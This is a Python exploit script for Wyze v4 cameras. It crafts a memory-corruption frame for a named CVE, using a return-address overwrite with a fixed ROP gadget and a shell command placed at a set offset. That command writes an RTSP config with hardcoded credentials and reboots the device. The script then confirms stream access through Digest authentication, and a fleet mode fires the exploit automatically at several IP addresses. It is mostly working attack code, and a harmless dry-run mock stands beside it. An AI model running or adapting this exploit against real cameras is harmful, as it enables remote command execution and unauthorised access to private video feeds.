#!/usr/bin/env python3
"""Wyze v4 one-shot RTSP enable, without app/cloud/SD (fss-0mws3).

Sequence, exactly once per invocation:

  1. send the CVE-2026-38698 frame via the proven `0x29e9` path harness
     (wyze_av_inject.py record layout: 16-byte parser header `05 00 0c 00`,
     RA at buffer 0x534 / payload offset 309, command at 0x550 / 337,
     TWO=1 VER=0) carrying
     `echo {"username":"<user>","ha1":"<md5(user:Wyze_Cam:pass)>","mode":1}
     >/configs/rtsp_config.json && reboot`
     — iCamera dies and respawns (~20 s outage), reads the new config at boot;
  2. poll TCP 554 until it connects (the boot rebinds it);
  3. do ONE Digest DESCRIBE (fssuser/fss12345, realm Wyze_Cam) and record the
     status. 200 = account works; 401 = listener up, account not provisioned.

The camera is power-cycled by the frame itself (`reboot` in the command), so
the "config written vs daemon serving" split from rtsp-enable.md resolves the
right way around: the boot re-runs `wyze_rtsp_sdk_init_v2` with real encoder
params and starts the server from the saved config.

No flashing, no SD, no UART. Dry-run drives a local mock (TCP echo listener +
mock RTSP server) instead of the camera.

usage:
  wyze_rtsp_one_shot.py --ip 192.168.4.24 --uid U --enr E --mac M \
      [--user fssuser --pass fss12345] [--realm Wyze_Cam] \
      [--ra-off 309 --cmd-off 337 --declared 400] [--poll-secs 120] [--dry]

exit: 0 describe accepted (or dry-run mock matched), 1 no listener, 2
      describe rejected/other, 3 session failure.
"""
import argparse
import hashlib
import os
import socket
import struct
import subprocess  # nosec B404 - ping only, fixed argv, no shell
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import wyze_ioctl_client as W  # noqa: E402

# 4.52.17.26 gadget: move a1,zero ; jal exec_shell_sync ; addiu a0,sp,0x18
GADGET_26 = 0x484E2C

RA_OFF = 309      # payload offset in packet 1 == buffer 0x534 (saved ra)
CMD_OFF = 337     # buffer 0x550, a0 after the epilogue
DECLARED = 400    # both packets declare 400
PKT0_FILL = 1023  # packet 0 is 1023 bytes of 0x41, pushing the buffer offset

TRANSPORT_PREFIX = bytes.fromhex("05000c00")  # type@0, frag@2, hdrskip@4

UA = "fss-one-shot/1.0"


def build_command(user: str, realm: str, pwd: str) -> str:
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    cfg = '{"username":"%s","ha1":"%s","mode":1}' % (user, ha1)
    # single shell word chain, no quotes inside: the payload is NUL-terminated
    # at 337 and `exec_shell_sync` takes it verbatim
    return f"echo {cfg} >/configs/rtsp_config.json && reboot"


def build_frame(cmd: bytes, ra: int, ra_off: int, cmd_off: int,
                declared: int, channel: int, frame_no: int) -> bytes:
    """Record exactly as `_doAVTransNew` reads it (wyze_av_inject.py layout)."""
    hdr = bytearray(28)
    hdr[0] = channel
    hdr[1] = 0x01
    struct.pack_into("<H", hdr, 2, 0)          # version 0 — the header trap
    n = int(time.time()) & 0x7FFFFFFF
    struct.pack_into("<H", hdr, 8, n & 0xFFFF)          # live tx word
    struct.pack_into("<H", hdr, 12, 2)                  # frag count (TWO=1)
    struct.pack_into("<H", hdr, 14, 0)                  # header skip
    struct.pack_into("<H", hdr, 16, declared)
    struct.pack_into("<I", hdr, 20, 0)                  # packet number
    struct.pack_into("<I", hdr, 24, frame_no)

    pkt0 = bytes(hdr) + b"\x41" * PKT0_FILL

    pl = bytearray(b"\x41" * declared)
    pl[ra_off:ra_off + 4] = struct.pack("<I", ra)
    if cmd_off + len(cmd) + 1 > declared:
        raise ValueError(f"cmd {len(cmd)}B does not fit at {cmd_off}/{declared}")
    pl[cmd_off:cmd_off + len(cmd) + 1] = cmd + b"\x00"
    hdr2 = bytearray(hdr)
    struct.pack_into("<I", hdr2, 20, 1)                 # packet number 1
    pkt1 = bytes(hdr2) + bytes(pl)

    # The parser's actual view (fss-wyze-av-shell-2c37b): each packet on the
    # wire is 4-byte transport glue + the 28-byte header + the packet payload.
    # header [0]=channel [1]=ftype [2..4]=version(0) [4..8]=tx_seq
    # [8..10]=tx_word [12..14]=pkt_total [14..16]=pkt_idx [16..18]=declared
    # [24..28]=frame_no. Payload offset 309 in packet 1 == buffer 0x534 (RA),
    # 337 == buffer 0x550 (a0 after the epilogue).
    rec = bytearray()
    for idx, p in enumerate((pkt0, pkt1)):
        h = bytearray(28)
        h[0] = channel
        h[1] = 0x01
        struct.pack_into("<H", h, 2, 0)                 # version 0
        struct.pack_into("<I", h, 4, frame_no)          # tx_seq
        struct.pack_into("<H", h, 8, n & 0xFFFF)
        struct.pack_into("<H", h, 12, 2)                # pkt_total = 2
        struct.pack_into("<H", h, 14, idx)              # pkt_idx
        struct.pack_into("<H", h, 16, len(p) - 28)      # declared payload size
        struct.pack_into("<I", h, 20, 0)
        struct.pack_into("<I", h, 24, frame_no)
        rec += TRANSPORT_PREFIX + bytes(h) + p[28:]
    return bytes(rec)


def send_frame(cam: "W.Cam", frame: bytes) -> None:
    cam.send(cam.encrypt(23, frame))


def poll_554(ip: str, secs: int) -> bool:
    end = time.time() + secs
    while time.time() < end:
        try:
            s = socket.create_connection((ip, 554), timeout=1.5)
            s.close()
            return True
        except OSError:
            time.sleep(2.0)
    return False


def digest_describe(ip: str, user: str, pwd: str, realm_hint: str | None,
                    timeout: float = 5.0, port: int = 554) -> tuple[int | None, str]:
    """ONE DESCRIBE with Digest auth; returns (status, transcript)."""
    uri = f"rtsp://{ip}:{port}/stream0"
    trans: list[str] = []

    def rtsp_round(body: str) -> str:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(body.encode())
        chunks = []
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                chunks.append(d.decode("utf-8", "replace"))
                if "\r\n\r\n" in chunks[-1] or len(chunks) > 8:
                    break
        except socket.timeout:
            pass
        s.close()
        return "".join(chunks)

    # round 1: unauthenticated to harvest the challenge
    r1 = rtsp_round(
        f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: {UA}\r\nAccept: application/sdp\r\n\r\n"
    )
    trans.append(r1)
    nonce, realm = "", realm_hint or "Wyze_Cam"
    for line in r1.split("\r\n"):
        low = line.lower()
        if low.startswith("www-authenticate:"):
            for part in line.split(","):
                part = part.strip()
                if part.lower().startswith("nonce="):
                    nonce = part.split("=", 1)[1].strip('"')
                if part.lower().startswith("realm="):
                    realm = part.split("=", 1)[1].strip('"')
    if not nonce:
        code = _status(r1)
        return (code, "\n---\n".join(trans))

    def ha(x: str) -> str:
        return hashlib.md5(x.encode()).hexdigest()

    ha1 = ha(f"{user}:{realm}:{pwd}")
    ha2 = ha(f"DESCRIBE:{uri}")
    resp = ha(f"{ha1}:{nonce}:{ha2}")
    r2 = rtsp_round(
        f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\nUser-Agent: {UA}\r\n"
        f'Authorization: Digest username="{user}", realm="{realm}", nonce="{nonce}", '
        f'uri="{uri}", response="{resp}"\r\nAccept: application/sdp\r\n\r\n'
    )
    trans.append(r2)
    return (_status(r2), "\n---\n".join(trans))


def _status(text: str) -> int | None:
    for line in text.split("\r\n"):
        parts = line.split()
        if len(parts) >= 2 and parts[0].startswith("RTSP/"):
            try:
                return int(parts[1])
            except ValueError:
                return None
    return None


class Mock:
    """Local stand-in for the camera: a TCP 554 RTSP server that answers
    exactly like the real one (401 challenge, then 200 on a good Digest)."""

    def __init__(self, user: str, pwd: str, realm: str):
        self.user, self.pwd, self.realm = user, pwd, realm
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(4)
        self.port = self.srv.getsockname()[1]
        import threading
        self.t = threading.Thread(target=self._serve, daemon=True)
        self.t.start()

    def _serve(self) -> None:
        import threading
        while True:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            threading.Thread(target=self._one, args=(c,), daemon=True).start()

    def _one(self, c: socket.socket) -> None:
        c.settimeout(4)
        try:
            req = c.recv(4096).decode("utf-8", "replace")
        except OSError:
            c.close(); return
        if "response=" in req:
            import re
            m = re.search(r'response="([0-9a-f]+)"', req)
            uri = re.search(r'uri="([^"]+)"', req)
            nonce = re.search(r'nonce="([^"]+)"', req)
            ok = False
            if m and uri and nonce:
                ha1 = hashlib.md5(f"{self.user}:{self.realm}:{self.pwd}".encode()).hexdigest()
                ha2 = hashlib.md5(f"DESCRIBE:{uri.group(1)}".encode()).hexdigest()
                ok = m.group(1) == hashlib.md5(f"{ha1}:{nonce.group(1)}:{ha2}".encode()).hexdigest()
            c.sendall(b"RTSP/1.0 200 OK\r\nCSeq: 2\r\nContent-Type: application/sdp\r\n\r\n" if ok
                      else b"RTSP/1.0 401 Unauthorized\r\nCSeq: 2\r\n\r\n")
        else:
            c.sendall(
                (f'RTSP/1.0 401 Unauthorized\r\nCSeq: 1\r\nWWW-Authenticate: Digest realm="{self.realm}", '
                 f'nonce="{os.urandom(8).hex()}"\r\n\r\n').encode()
            )
        c.close()


FLEET = ("192.168.4.23", "192.168.4.24", "192.168.5.181",
         "192.168.5.242", "192.168.6.65")
FLEET_INTERVAL = 30      # s between full-fleet pings
BOOT_GRACE = 20          # s after first ICMP before the frame: userspace settle

CFG_DIR = os.path.expanduser("~/fss-exploit/cfg")


def cfg_for(ip: str) -> tuple[str, str, str] | None:
    """uid/enr/mac from the operator cfg store (same files e2e_capture.sh uses)."""
    import json
    path = os.path.join(CFG_DIR, f"{ip}.json")
    try:
        d = json.load(open(path))
        return d["uid"], d["enr"], d["mac"]
    except (OSError, KeyError, ValueError):
        return None


def ping(ip: str) -> bool:
    return subprocess.run(  # nosec - returncode IS the check
        ["ping", "-c", "1", "-t", "2", ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    ).returncode == 0


def fire(ip: str, uid: str, enr: str, mac: str, a: argparse.Namespace,
         cmd: bytes) -> tuple[bool, int | None]:
    """One real attempt: login, frame, 554 poll, one DESCRIBE.

    Returns (listened, describe_status)."""
    try:
        cam = W.Cam(ip, mac, uid, enr)
        cam.full_login()
    except Exception as e:
        print(f"{ip}: session failed: {e}")
        return False, None
    frame = build_frame(cmd, a.ra, a.ra_off, a.cmd_off,
                        a.declared, a.channel, frame_no=int(time.time()) & 0x7FFF)
    send_frame(cam, frame)
    print(f"{ip}: frame sent {len(frame)}B ra={a.ra:#x} ra_off={a.ra_off} "
          f"cmd_off={a.cmd_off} declared={a.declared}")
    up = poll_554(ip, a.poll_secs)
    print(f"{ip}: 554 listening: {up}")
    if not up:
        return False, None
    status, transcript = digest_describe(ip, a.user, a.pwd, a.realm)
    print(f"{ip}: DESCRIBE -> {status}")
    print(transcript)
    return True, status


def loop_watch(a: argparse.Namespace, cmd: bytes) -> int:
    """Fleet watch: ping all known Wyze addresses every FLEET_INTERVAL s; on
    first ICMP answer wait BOOT_GRACE for userspace, fire the frame once, run
    the DESCRIBE check, and record the outcome. Units already fired are
    skipped for the life of the process."""
    pending = list(a.targets or FLEET)
    fired: dict[str, tuple[bool, int | None]] = {}
    print(f"watch: fleet={pending} interval={FLEET_INTERVAL}s grace={BOOT_GRACE}s")
    while pending:
        for ip in list(pending):
            if not ping(ip):
                continue
            print(f"{ip}: ICMP up at {time.strftime('%H:%M:%S')}, "
                  f"waiting {BOOT_GRACE}s for userspace")
            time.sleep(BOOT_GRACE)
            cfg = cfg_for(ip)
            if cfg is None:
                print(f"{ip}: no cfg in {CFG_DIR}, cannot fire")
            else:
                fired[ip] = fire(ip, *cfg, a, cmd)
            pending.remove(ip)
        if pending:
            time.sleep(FLEET_INTERVAL)
    print("watch: fleet exhausted")
    for ip, (up, st) in fired.items():
        print(f"  {ip}: listened={up} describe={st}")
    return 0 if any(st == 200 for _, st in fired.values()) else 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="192.168.4.24")
    ap.add_argument("--uid", required=True)
    ap.add_argument("--enr", required=True)
    ap.add_argument("--mac", required=True)
    ap.add_argument("--user", default="fssuser")
    ap.add_argument("--pass", dest="pwd", default="fss12345")
    ap.add_argument("--realm", default="Wyze_Cam")
    ap.add_argument("--ra", type=lambda s: int(s, 0), default=GADGET_26)
    ap.add_argument("--ra-off", type=int, default=RA_OFF)
    ap.add_argument("--cmd-off", type=int, default=CMD_OFF)
    ap.add_argument("--declared", type=int, default=520,
                    help="packet-1 declared size; >= cmd_off+len(cmd)+1")
    ap.add_argument("--channel", type=lambda s: int(s, 0), default=7)
    ap.add_argument("--poll-secs", type=int, default=120)
    ap.add_argument("--dry", action="store_true",
                    help="mock RTSP server instead of the camera frame")
    ap.add_argument("--loop-watch", action="store_true",
                    help="watch the whole fleet and fire on first ICMP answer")
    ap.add_argument("--targets", nargs="*", help="override the fleet list")
    a = ap.parse_args()

    cmd = build_command(a.user, a.realm, a.pwd).encode()
    print(f"cmd ({len(cmd)}B): {cmd.decode()}")

    if a.loop_watch:
        return loop_watch(a, cmd)

    if a.dry:
        mock = Mock(a.user, a.pwd, a.realm)
        ip, port = "127.0.0.1", mock.port
        print(f"dry: mock rtsp on {ip}:{port}")
        # exercise the frame builder too: nothing goes on the wire
        frame = build_frame(cmd, a.ra, a.ra_off, a.cmd_off,
                            a.declared, a.channel, frame_no=1)
        print(f"dry: frame built, {len(frame)}B "
              f"(ra@{a.ra_off}={a.ra:#x}, cmd@{a.cmd_off})")
        status, transcript = digest_describe(ip, a.user, a.pwd, a.realm, port=port)
    else:
        up, status = fire(a.ip, a.uid, a.enr, a.mac, a, cmd)
        if not up:
            return 1

    if a.dry:
        print(f"DESCRIBE -> {status}")
        print(transcript)
    if status == 200:
        return 0
    if status is None:
        return 1
    return 2


if __name__ == "__main__":
    sys.exit(main())
